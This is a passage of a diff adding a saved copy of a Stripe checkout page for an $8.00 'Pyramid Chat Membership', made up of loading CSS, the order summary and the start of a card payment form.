@@ -1,0 +1,1634 @@
+<!DOCTYPE html>
+<!-- saved from url=(0094)https://buy.stripe.com/7sIg1N0lscpS7IcaEE?client_reference_id=ZGVsZXRlX3VzZXJfdWx2aWxvNW5vdzY- -->
+<html translate="no" lang="en">
+
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <meta name="google" content="notranslate">
+    <title>My Store</title>
+
+
+    <style type="text/css">
+      @-webkit-keyframes placeload {
+        0% {
+          -webkit-transform: translateX(-100%);
+          transform: translateX(-100%)
+        }
+
+        to {
+          -webkit-transform: translateX(100%);
+          transform: translateX(100%)
+        }
+      }
+
+      @keyframes placeload {
+        0% {
+          -webkit-transform: translateX(-100%);
+          transform: translateX(-100%)
+        }
+
+        to {
+          -webkit-transform: translateX(100%);
+          transform: translateX(100%)
+        }
+      }
+
+      @-webkit-keyframes exit {
+        0% {
+          opacity: 1
+        }
+
+        to {
+          opacity: 0
+        }
+      }
+
+      @keyframes exit {
+        0% {
+          opacity: 1
+        }
+
+        to {
+          opacity: 0
+        }
+      }
+
+      @-webkit-keyframes enter {
+        0% {
+          opacity: .1;
+          -webkit-transform: scale(.97);
+          transform: scale(.97)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: scale(1);
+          transform: scale(1)
+        }
+      }
+
+      @keyframes enter {
+        0% {
+          opacity: .1;
+          -webkit-transform: scale(.97);
+          transform: scale(.97)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: scale(1);
+          transform: scale(1)
+        }
+      }
+
+      @-webkit-keyframes enter-form-mobile {
+        0% {
+          opacity: .1;
+          -webkit-transform: translateY(1rem);
+          transform: translateY(1rem)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: none;
+          transform: none
+        }
+      }
+
+      @keyframes enter-form-mobile {
+        0% {
+          opacity: .1;
+          -webkit-transform: translateY(1rem);
+          transform: translateY(1rem)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: none;
+          transform: none
+        }
+      }
+
+      @-webkit-keyframes enter-form-desktop {
+        0% {
+          opacity: .1;
+          -webkit-transform: translateX(1.5rem);
+          transform: translateX(1.5rem)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: none;
+          transform: none
+        }
+      }
+
+      @keyframes enter-form-desktop {
+        0% {
+          opacity: .1;
+          -webkit-transform: translateX(1.5rem);
+          transform: translateX(1.5rem)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: none;
+          transform: none
+        }
+      }
+
+      @-webkit-keyframes enter-background-shadow {
+        0% {
+          opacity: .1;
+          -webkit-transform: scaleX(.9);
+          transform: scaleX(.9)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: scaleX(1);
+          transform: scaleX(1)
+        }
+      }
+
+      @keyframes enter-background-shadow {
+        0% {
+          opacity: .1;
+          -webkit-transform: scaleX(.9);
+          transform: scaleX(.9)
+        }
+
+        to {
+          opacity: 1;
+          -webkit-transform: scaleX(1);
+          transform: scaleX(1)
+        }
+      }
+
+      @-webkit-keyframes spin {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg)
+        }
+
+        to {
+          -webkit-transform: rotate(1turn);
+          transform: rotate(1turn)
+        }
+      }
+
+      @keyframes spin {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg)
+        }
+
+        to {
+          -webkit-transform: rotate(1turn);
+          transform: rotate(1turn)
+        }
+      }
+
+      body {
+        margin: 0;
+        padding: 0
+      }
+
+      .LOADING-loads {
+        background-color: rgba(0, 0, 0, .05);
+        border-radius: 7px;
+        overflow: hidden;
+        position: relative
+      }
+
+      .LOADING-loads:after {
+        -webkit-animation: placeload 1.3s linear infinite forwards;
+        animation: placeload 1.3s linear infinite forwards;
+        background: linear-gradient(90deg, rgba(255, 255, 255, 0), rgba(255, 255, 255, .65) 50%, rgba(255, 255, 255, 0));
+        content: "";
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        -webkit-transform: translateX(-100%);
+        -ms-transform: translateX(-100%);
+        transform: translateX(-100%);
+        width: 200%
+      }
+
+      .LOADING-container {
+        -webkit-animation: enter .3s 0s;
+        animation: enter .3s 0s;
+        -webkit-animation-fill-mode: both;
+        animation-fill-mode: both;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        height: 100%;
+        left: 0;
+        padding: 0 16px;
+        pointer-events: none;
+        position: absolute;
+        right: 0;
+        top: 0;
+        z-index: 9999999
+      }
+
+      .LOADING-container.is-embedded {
+        display: block;
+        height: auto
+      }
+
+      .LOADING-container.is-hidden {
+        display: none
+      }
+
+      .LOADING-hidden {
+        -webkit-animation: exit .3s;
+        animation: exit .3s;
+        -webkit-animation-fill-mode: both;
+        animation-fill-mode: both
+      }
+
+      .LOADING-checkoutContainer {
+        box-sizing: border-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        margin: 0 auto;
+        max-width: 380px;
+        padding: 16px 0;
+        position: relative;
+        width: 100%
+      }
+
+      .LOADING-container.is-embedded .LOADING-checkoutContainer {
+        margin-top: 43px;
+        padding: 0 47px 0 32px
+      }
+
+      .LOADING-container.is-embedded.LOADING-container--single .LOADING-checkoutContainer {
+        margin-top: -34px
+      }
+
+      .LOADING-header {
+        min-height: 32px
+      }
+
+      .LOADING-backArrow,
+      .LOADING-header {
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex
+      }
+
+      .LOADING-backArrow {
+        -ms-flex-pack: center;
+        color: rgba(0, 0, 0, .2);
+        height: 32px;
+        -webkit-justify-content: center;
+        justify-content: center;
+        margin-right: 8px;
+        width: 14px
+      }
+
+      .LOADING-logo {
+        border-radius: 100%;
+        height: 28px;
+        width: 28px
+      }
+
+      .LOADING-productSummary {
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        margin-bottom: 10px;
+        margin-top: 32px
+      }
+
+      .LOADING-productTitle {
+        -ms-flex-order: 2;
+        border-radius: 20px;
+        height: 16px;
+        margin: 2px 0;
+        -webkit-order: 2;
+        order: 2;
+        width: 85px
+      }
+
+      .LOADING-productPrice {
+        -ms-flex-order: 3;
+        border-radius: 20px;
+        height: 28px;
+        margin: 8px 0 32px;
+        -webkit-order: 3;
+        order: 3;
+        width: 123px
+      }
+
+      .LOADING-productImageContainer {
+        -ms-flex-order: 1;
+        margin: 0 auto 20px;
+        -webkit-order: 1;
+        order: 1
+      }
+
+      .LOADING-productImage {
+        -ms-flex-order: 1;
+        height: 120px;
+        -webkit-order: 1;
+        order: 1;
+        width: 120px
+      }
+
+      .LOADING-paymentTitle {
+        display: none
+      }
+
+      .LOADING-paymentHeader {
+        border-radius: 20px;
+        display: block;
+        height: 26px;
+        margin-bottom: 40px;
+        width: 160px
+      }
+
+      .LOADING-paymentHeader.is-hidden {
+        display: none
+      }
+
+      .LOADING-payment-oneRow,
+      .LOADING-payment-twoRow {
+        width: 100%
+      }
+
+      .LOADING-button {
+        height: 44px;
+        margin-top: 56px;
+        width: 100%
+      }
+
+      .LOADING-payment-oneRow {
+        height: 46px
+      }
+
+      .LOADING-payment-twoRow {
+        height: 90px
+      }
+
+      .LOADING-payment-link {
+        height: 110px
+      }
+
+      .LOADING-wallet {
+        height: 44px;
+        margin-bottom: 36px
+      }
+
+      .LOADING-walletDivider {
+        height: 1px;
+        margin-bottom: 48px
+      }
+
+      .LOADING-mb38 {
+        margin-bottom: 39px
+      }
+
+      .LOADING-mb24 {
+        margin-bottom: 24px
+      }
+
+      .LOADING-checkoutPayment {
+        -webkit-animation: enter-form-mobile .3s .1s;
+        animation: enter-form-mobile .3s .1s;
+        -webkit-animation-fill-mode: both;
+        animation-fill-mode: both;
+        margin-top: 48px;
+        opacity: .1;
+        -webkit-transform: translateY(2rem);
+        -ms-transform: translateY(2rem);
+        transform: translateY(2rem)
+      }
+
+      .LOADING-container--single .LOADING-checkoutPayment {
+        margin-top: 0
+      }
+
+      .LOADING-container--single .LOADING-productSummary {
+        display: none
+      }
+
+      .LOADING-container--single .LOADING-checkoutOverview {
+        margin-bottom: 66px;
+        padding-bottom: 0
+      }
+
+      .LOADING-footer {
+        bottom: -3em;
+        color: hsla(0, 0%, 10%, .5);
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Ubuntu, sans-serif;
+        font-size: 12px;
+        left: 0;
+        position: absolute;
+        text-align: center;
+        width: 100%
+      }
+
+      .LOADING-footer svg {
+        fill: hsla(0, 0%, 10%, .4);
+        position: relative;
+        top: 4px
+      }
+
+      .LOADING-container--single .LOADING-footer {
+        bottom: -2rem
+      }
+
+      .LOADING-container.LOADING-container--redirectPage .LOADING-checkoutContainer,
+      .LOADING-container.LOADING-container--spinner .LOADING-checkoutContainer {
+        display: none
+      }
+
+      .LOADING-container:not(.LOADING-container--redirectPage) .LOADING-redirectContainer {
+        display: none
+      }
+
+      .LOADING-container:not(.LOADING-container--spinner) .LOADING-spinner {
+        display: none
+      }
+
+      .LOADING-redirectContainer {
+        -ms-flex-align: center;
+        -ms-flex-pack: center;
+        -webkit-align-items: center;
+        align-items: center;
+        bottom: 0;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        height: 100vh;
+        -webkit-justify-content: center;
+        justify-content: center;
+        left: 0;
+        position: absolute;
+        right: 0;
+        top: 0
+      }
+
+      .LOADING-redirectContainer .LOADING-redirectSpinner {
+        -ms-flex-order: 1;
+        height: 60px;
+        -webkit-order: 1;
+        order: 1;
+        width: 60px
+      }
+
+      .LOADING-redirectContainer .LOADING-redirectSpinner,
+      .LOADING-redirectContainer .LOADING-redirectTitle {
+        -ms-flex-pack: center;
+        border-radius: 20px;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-justify-content: center;
+        justify-content: center
+      }
+
+      .LOADING-redirectContainer .LOADING-redirectTitle {
+        -ms-flex-order: 2;
+        height: 40px;
+        margin-top: 12px;
+        -webkit-order: 2;
+        order: 2;
+        width: 130px
+      }
+
+      .LOADING-redirectContainer .LOADING-redirectMessage {
+        -ms-flex-pack: center;
+        -ms-flex-order: 3;
+        border-radius: 20px;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        height: 60px;
+        -webkit-justify-content: center;
+        justify-content: center;
+        margin-top: 12px;
+        -webkit-order: 3;
+        order: 3;
+        width: 300px
+      }
+
+      .LOADING-spinner {
+        -webkit-animation: spin 1.4s linear infinite;
+        animation: spin 1.4s linear infinite;
+        background: linear-gradient(90deg, #bababa 10%, rgba(255, 255, 255, 0) 42%);
+        border-radius: 50%;
+        height: 48px;
+        margin: auto;
+        position: relative;
+        -webkit-transform: translateZ(0);
+        transform: translateZ(0);
+        width: 48px
+      }
+
+      .LOADING-spinner:before {
+        background: #ffffff;
+        border-radius: 100% 0 0 0;
+        content: "";
+        height: 50%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 50%
+      }
+
+      .LOADING-spinner:after {
+        background: #ffffff;
+        border-radius: 50%;
+        bottom: 0;
+        content: "";
+        height: 85%;
+        left: 0;
+        margin: auto;
+        position: absolute;
+        right: 0;
+        top: 0;
+        width: 85%
+      }
+
+      .LOADING-optimisticWalletRenderEnabled {
+        display: none
+      }
+
+      .LOADING-container--optimisticWalletRender .LOADING-optimisticWalletRenderEnabled {
+        display: block
+      }
+
+      .LOADING-container--optimisticWalletRender .LOADING-optimisticWalletRenderDisabled {
+        display: none
+      }
+
+      @media only screen and (max-width:991.98px) {
+        .LOADING-container.is-embedded .LOADING-checkoutContainer {
+          margin-top: 5px;
+          max-width: 412px;
+          padding: 15px
+        }
+
+        .is-embedded .LOADING-productSummary {
+          -ms-flex-align: start;
+          -webkit-align-items: flex-start;
+          align-items: flex-start;
+          -webkit-flex-direction: row;
+          -ms-flex-direction: row;
+          flex-direction: row
+        }
+
+        .is-embedded .LOADING-productImageContainer {
+          -ms-flex-order: -1;
+          margin: 0 16px 0 0;
+          -webkit-order: -1;
+          order: -1
+        }
+
+        .is-embedded .LOADING-productImage {
+          -ms-flex-order: 1;
+          height: 42px;
+          -webkit-order: 1;
+          order: 1;
+          width: 42px
+        }
+
+        .is-embedded .LOADING-checkoutPayment {
+          margin-top: 24px
+        }
+
+        .is-embedded.LOADING-container--single .LOADING-checkoutPayment {
+          margin-top: -12px
+        }
+
+        .is-embedded .LOADING-productPrice {
+          margin-bottom: 0
+        }
+      }
+
+      @media only screen and (min-width:992px) {
+        .LOADING-checkoutContainer {
+          -ms-flex-pack: justify;
+          -webkit-justify-content: space-between;
+          justify-content: space-between
+        }
+
+        .LOADING-payment-oneRow {
+          height: 38px
+        }
+
+        .LOADING-payment-twoRow {
+          height: 74px
+        }
+
+        .LOADING-header {
+          left: -21px;
+          min-height: 28px;
+          position: relative
+        }
+
+        .LOADING-backArrow {
+          height: 28px;
+          margin-left: 0
+        }
+
+        .LOADING-container {
+          -ms-flex-pack: center;
+          -ms-flex-align: center;
+          -webkit-align-items: center;
+          align-items: center;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-justify-content: center;
+          justify-content: center;
+          min-height: 0;
+          padding: 0
+        }
+
+        .LOADING-double .LOADING-checkoutContainer {
+          -webkit-flex-direction: row;
+          -ms-flex-direction: row;
+          flex-direction: row;
+          max-width: 920px;
+          padding: 16px 0 0
+        }
+
+        .LOADING-container--single .LOADING-checkoutContainer {
+          -ms-flex-align: center;
+          -webkit-align-items: center;
+          align-items: center
+        }
+
+        .LOADING-container:not(.LOADING-container--single) .LOADING-checkoutPayment {
+          -webkit-animation: enter-form-desktop .3s .1s forwards;
+          animation: enter-form-desktop .3s .1s forwards;
+          margin-top: 0;
+          opacity: .1;
+          -webkit-transform: translateX(2rem);
+          -ms-transform: translateX(2rem);
+          transform: translateX(2rem)
+        }
+
+        .LOADING-checkoutOverview,
+        .LOADING-checkoutPayment {
+          margin-bottom: 0;
+          padding-bottom: 40px;
+          width: 380px
+        }
+
+        .LOADING-container:not(.LOADING-container--single):not(.is-embedded):not(.hide-halfPageBoxShadow):before {
+          -webkit-animation: enter-background-shadow .3s;
+          animation: enter-background-shadow .3s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          background: white;
+          box-shadow: 15px 0 30px 0 rgba(0, 0, 0, .18);
+          content: " ";
+          height: 100vh;
+          opacity: .1;
+          position: fixed;
+          right: 0;
+          top: 0;
+          -webkit-transform: scaleX(.9);
+          -ms-transform: scaleX(.9);
+          transform: scaleX(.9);
+          -webkit-transform-origin: right;
+          -ms-transform-origin: right;
+          transform-origin: right;
+          width: 50%
+        }
+
+        .LOADING-container.LOADING-container--redirectPage:before {
+          display: none
+        }
+
+        .LOADING-productSummary {
+          -ms-flex-align: start;
+          -webkit-align-items: flex-start;
+          align-items: flex-start;
+          margin-bottom: 0
+        }
+
+        .LOADING-productTitle {
+          -ms-flex-order: 1;
+          -webkit-order: 1;
+          order: 1
+        }
+
+        .LOADING-productPrice {
+          -ms-flex-order: 2;
+          margin: 13px 0 32px;
+          -webkit-order: 2;
+          order: 2
+        }
+
+        .LOADING-container--multiItem .LOADING-productImageContainer {
+          display: none
+        }
+
+        .LOADING-productImageContainer {
+          -ms-flex-order: 3;
+          height: 300px;
+          margin: 32px 0;
+          -webkit-order: 3;
+          order: 3;
+          width: 300px
+        }
+
+        .LOADING-productImage {
+          -ms-flex-order: 3;
+          height: 187px;
+          -webkit-order: 3;
+          order: 3;
+          width: 187px
+        }
+
+        .LOADING-footer {
+          bottom: 0;
+          left: 0;
+          margin: 12px 0;
+          position: absolute;
+          text-align: left
+        }
+
+        .LOADING-paymentTitle {
+          border-radius: 20px;
+          display: block;
+          height: 26px;
+          margin-bottom: 40px;
+          width: 160px
+        }
+
+        .LOADING-container--single .LOADING-footer {
+          text-align: center
+        }
+
+        .LOADING-container--multiItem .LOADING-lineItem {
+          -ms-flex-order: 3;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          margin-bottom: 24px;
+          -webkit-order: 3;
+          order: 3
+        }
+
+        .LOADING-container--multiItem .LOADING-productImage {
+          display: none
+        }
+
+        .LOADING-container--multiItem .LOADING-lineItem-image {
+          display: inline-block;
+          height: 42px;
+          width: 42px
+        }
+
+        .LOADING-container--multiItem .LOADING-lineItem-lines {
+          -ms-flex-pack: justify;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          -webkit-justify-content: space-between;
+          justify-content: space-between;
+          margin-left: 12px
+        }
+
+        .LOADING-container--multiItem .LOADING-lineItem-line {
+          height: 12px;
+          width: 280px
+        }
+      }
+    </style>
+
+ 
+    <link rel="stylesheet" type="text/css" href="./checkout_files/checkout-app-init-164b7655cf8e323799fbafadfa9c458c.css">
+    <link rel="stylesheet" type="text/css" href="./checkout_files/icon-2164909f61112d056505d20036bd32fc.css">
+
+  </head>
+  <body>
+    <div>
+      <div class="App-Container is-squareBordered flex-container justify-content-center" data-testid="checkout-container">
+        <div class="App-Background" style="background-color: rgb(241, 244, 247);"></div>
+        <div class="App App--multiItem">
+          <div class="App-Overview" style="background-color: rgb(241, 244, 247);">
+            <header class="Header" style="background-color: rgb(241, 244, 247);">
+              <div class="Header-content flex-container justify-content-space-between align-items-stretch">
+                <div class="Header-business flex-item width-grow flex-container align-items-center">
+                  <div class="Header-merchantLogoWithLabel">
+                    <div class="HeaderImage HeaderImage--logo flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
+                      <img alt="CIRCO INDUSTRIES LLC logo" src="./checkout_files/68747470733a2f2f66696c65732e7374726970652e636f6d2f66696c65732f4d44423859574e6a64463878537a5255644846455157564e5657746e56446c7a66475a6662476c325a5639365a6d4a42546b784554314e784d6d704663584e5255574e565a554a364e" class="HeaderImage-img" loading="lazy">
+                    </div>
+                    <span class="Header-businessLink-label Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500">Back</span>
+                  </div>
+                </div>
+                <div class="Header-actions flex-item width-fixed">
+                  <button class="Button Header-viewDetailsButton Button--link Button--sm" type="button">
+                    <div class="flex-container justify-content-flex-end align-items-center">
+                      <svg class="InlineSVG Icon Button-Icon Button-Icon--right Icon--sm Icon--square" focusable="false" viewBox="0 0 12 12">
+                        <path d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4.193z" fill-rule="evenodd"></path>
+                      </svg>
+                      <div class="Header-detailsLabel" style="position: unset; opacity: 1; transform: none;">
+                        <span class="Text Text-color--default Text-fontSize--13 Text-fontWeight--400 Text--truncate">Details</span>
+                      </div>
+                    </div>
+                  </button>
+                </div>
+              </div>
+            </header>
+            <div class="OrderSummaryColumn" data-testid="order-summary-column">
+              <div data-testid="product-summary" class="ProductSummary is-clickable">
+                <div class="ProductSummary-productImageContainer is-clickable" data-testid="product-summary-product-image">
+                  <div class="ProductImage-container" data-testid="product-image">
+                    <img src="./checkout_files/68747470733a2f2f66696c65732e7374726970652e636f6d2f6c696e6b732f4d44423859574e6a64463878537a5255644846455157564e5657746e56446c7a66475a7358327870646d5666596d3077626d787a4e47394f575546795a56687955546c555357355253" alt="Pyramid Chat Membership" class="ProductImage-image" fetchpriority="high">
+                  </div>
+                </div>
+                <div class="ProductSummary-info is-clickable">
+                  <span class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500" data-testid="product-summary-name">Pay My Store</span>
+                  <div class="ProductSummary-amountsContainer">
+                    <div class="ProductSummary-totalsRead" style="opacity: 1;">
+                      <div class="ProductSummary-totalAmountContainer is-clickable" style="opacity: 1;">
+                        <span class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers" id="ProductSummary-totalAmount" data-testid="product-summary-total-amount">
+                          <span class="CurrencyAmount">$8.00</span>
+                        </span>
+                      </div>
+                      <span class="ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500" id="ProductSummary-description" data-testid="product-summary-description"></span>
+                    </div>
+                  </div>
+                  <div class="ProductSummary-buttonsContainer" data-testid="product-summary-buttons"></div>
+                </div>
+              </div>
+              <section data-testid="order-details" class="OrderDetails App-Overview-OrderDetails my6">
+                <ul class="OrderDetails-items">
+                  <li class="OrderDetails-item" style="opacity: 1; transform: scale(1); height: auto; margin-bottom: 16px;">
+                    <div class="LineItem flex-container align-items-flex-start">
+                      <div class="LineItem-imageContainer mr4 flex-item width-fixed" data-testid="line-item-image">
+                        <img src="./checkout_files/68747470733a2f2f66696c65732e7374726970652e636f6d2f6c696e6b732f4d44423859574e6a64463878537a5255644846455157564e5657746e56446c7a66475a7358327870646d5666596d3077626d787a4e47394f575546795a56687955546c555357355253" alt="" class="LineItem-image">
+                      </div>
+                      <div class="flex-container justify-content-space-between align-items-baseline wrap-wrap width-grow">
+                        <div class="flex-column-break" style="order: 2;"></div>
+                        <div class="flex-column-break" style="order: 5;"></div>
+                        <div class="LineItem-productName flex-item width-auto" data-testid="line-item-product-name" style="order: 0;">
+                          <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">
+                            <div class="ExpandableText false">
+                              <div data-testid="" class="ExpandableText--truncated" style="-webkit-line-clamp: 2;">Product</div>
+                            </div>
+                          </span>
+                        </div>
+                        <div class="flex-container wrap-wrap" style="width: 100%; order: 3;">
+                          <div class="LineItem-description flex-item width-grow" style="order: 3;">
+                            <span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400"></span>
+                          </div>
+                          <div class="LineItem-amountDetail flex-item width-auto flex-item-align-right" data-testid="line-item-amount-detail" style="order: 4;">
+                            <span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">
+                              <span class="CurrencyAmount">$8.00</span> per membership </span>
+                          </div>
+                        </div>
+                        <div class="LineItem-tierBreakdown flex-item width-auto flex-item-align-left" style="order: 6;">
+                          <div class="flex-container" data-testid="line-item-tiers"></div>
+                        </div>
+                        <div class="flex-container Placeholder" style="opacity: 1;">
+                          <div class="ml2 flex-item width-fixed" data-testid="line-item-total-amount" style="order: 1;">
+                            <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500 Text--tabularNumbers">
+                              <span class="CurrencyAmount">$8.00</span>
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </li>
+                </ul>
+                <div class="OrderDetails-footer">
+                  <div class="OrderDetailsFooter-subtotal OrderDetailsFooter-subtotal--indented flex-container justify-content-space-between">
+                    <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">Subtotal</span>
+                    <div class="flex-container Placeholder" style="opacity: 1;">
+                      <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--600 Text--tabularNumbers" id="OrderDetailsFooter-SubtotalAmount">
+                        <span class="CurrencyAmount">$8.00</span>
+                      </span>
+                    </div>
+                  </div>
+                  <div class="OrderDetailsFooter-subtotalItems OrderDetailsFooter-subtotalItems--indented flex-container direction-column">
+                    <div>
+                      <div class="OrderDetailsSubtotalItem flex-container justify-content-space-between">
+                        <div>
+                          <div class="flex-container">
+                            <span class="OrderDetails-subtotalItemLabel-Text Text Text-color--gray400 Text-fontSize--14">Tax <div class="Tooltip-Context OrderDetailsSubtotalItem-tooltipContext" style="padding: 0px;">
+                                <svg class="InlineSVG Icon Icon--sm Icon--square" focusable="false" width="12" height="12" viewBox="0 0 12 12" fill="none">
+                                  <path d="M6 12C9.28235 12 12 9.28235 12 6C12 2.72353 9.27647 0 5.99412 0C2.71765 0 0 2.72353 0 6C0 9.28235 2.72353 12 6 12ZM6 11C3.22353 11 1.00588 8.77647 1.00588 6C1.00588 3.22941 3.21765 1 5.99412 1C8.77059 1 10.9941 3.22941 11 6C11.0059 8.77647 8.77647 11 6 11ZM5.94706 3.90588C6.37647 3.90588 6.71177 3.56471 6.71177 3.14118C6.71177 2.71176 6.37647 2.37059 5.94706 2.37059C5.52353 2.37059 5.18235 2.71176 5.18235 3.14118C5.18235 3.56471 5.52353 3.90588 5.94706 3.90588ZM4.97059 9.23529H7.36471C7.60588 9.23529 7.79412 9.06471 7.79412 8.82353C7.79412 8.59412 7.60588 8.41177 7.36471 8.41177H6.63529V5.41765C6.63529 5.1 6.47647 4.88824 6.17647 4.88824H5.18235C4.94118 4.88824 4.75294 5.07059 4.75294 5.3C4.75294 5.54118 4.94118 5.71176 5.18235 5.71176H5.7V8.41177H4.97059C4.72941 8.41177 4.54118 8.59412 4.54118 8.82353C4.54118 9.06471 4.72941 9.23529 4.97059 9.23529Z" fill="currentColor"></path>
+                                </svg>
+                              </div>
+                            </span>
+                          </div>
+                        </div>
+                        <div class="flex-container Placeholder" style="opacity: 1;">
+                          <span class="Text Text-color--gray400 Text-fontSize--14 Text--tabularNumbers">
+                            <span class="CurrencyAmount">$0.00</span>
+                          </span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="OrderDetails-total OrderDetails-total--indented flex-container justify-content-space-between">
+                    <span>
+                      <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">Total due</span>
+                    </span>
+                    <div class="flex-container Placeholder" style="opacity: 1;">
+                      <span class="Text Text-color--default Text-fontSize--16 Text-fontWeight--600 Text--tabularNumbers" id="OrderDetails-TotalAmount">
+                        <span class="CurrencyAmount">$8.00</span>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+          <div class="App-Payment">
+            <main>
+              <div class="CheckoutPaymentForm">
+                <div class="PaymentRequestOrHeader" style="display: inherit; height: auto;">
+                  <div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
+                    <div class="PaymentHeader">
+                      <div class="Text Text-color--default Text-fontSize--20 Text-fontWeight--500">Pay with card</div>
+                    </div>
+                  </div>
+                  <div class="ButtonAndDividerContainer" style="opacity: 0; height: 0px; display: none;">
+                    <div class="ButtonContainer">
+                      <div>
+                        <div class="ButtonWrapper"></div>
+                      </div>
+                    </div>
+                    <div></div>
+                    <div>
+                      <div class="Divider">
+                        <hr>
+                        <p class="Divider-Text Text Text-color--gray400 Text-fontSize--14 Text-fontWeight--400">
+                          <span class="DividerText">Or pay with card</span>
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="PaymentFormFixedHeightContainer flex-container direction-column" style="height: 539px;">
+                  <form novalidate="">
+                    <div style="height: 431.156px;">
+                      <div>
+                        <div style="opacity: 1;">
+                          <div class="App-Global-Fields flex-container spacing-16 direction-row wrap-wrap">
+                            <div class="flex-item width-12">
+                              <div class="FormFieldGroup" data-qa="FormFieldGroup-email">
+                                <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                  <label for="email">
+                                    <span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Email</span>
+                                  </label>
+                                  <div style="opacity: 1; transform: none;"></div>
+                                </div>
+                                <div class="FormFieldGroup-Fieldset" id="email-fieldset">
+                                  <div class="FormFieldGroup-container">
+                                    <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                      <div class="FormFieldInput">
+                                        <div class="CheckoutInputContainer">
+                                          <span class="InputContainer" data-max="">
+                                            <input class="CheckoutInput Input Input--empty email" autocomplete="email" autocorrect="off" spellcheck="false" autocapitalize="none" id="email" name="email" type="text" inputmode="email" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value="">
+                                          </span>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div class="FieldError-container" style="opacity: 0; height: 0px;">
+                                      <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                        <span aria-hidden="true"></span>
+                                      </span>
+                                    </div>
+                                  </div>
+                                  <div class="FieldError-container" style="opacity: 0; height: 0px;">
+                                    <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                      <span aria-hidden="true"></span>
+                                    </span>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="PaymentMethodForm" style="opacity: 1; height: auto;">
+                            <div>
+                              <div class="PaymentForm-paymentMethodForm flex-container direction-column wrap-wrap" style="gap: 16px;">
+                                <div class="flex-item width-12">
+                                  <div class="FormFieldGroup">
+                                    <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                      <label for="cardNumber-fieldset">
+                                        <span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Card information</span>
+                                      </label>
+                                    </div>
+                                    <fieldset class="FormFieldGroup-Fieldset" id="cardNumber-fieldset">
+                                      <div class="FormFieldGroup-container" id="cardNumber-fieldset-inner">
+                                        <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
+                                          <div class="FormFieldInput padding-right-120">
+                                            <div class="CheckoutInputContainer">
+                                              <span class="InputContainer" data-max="">
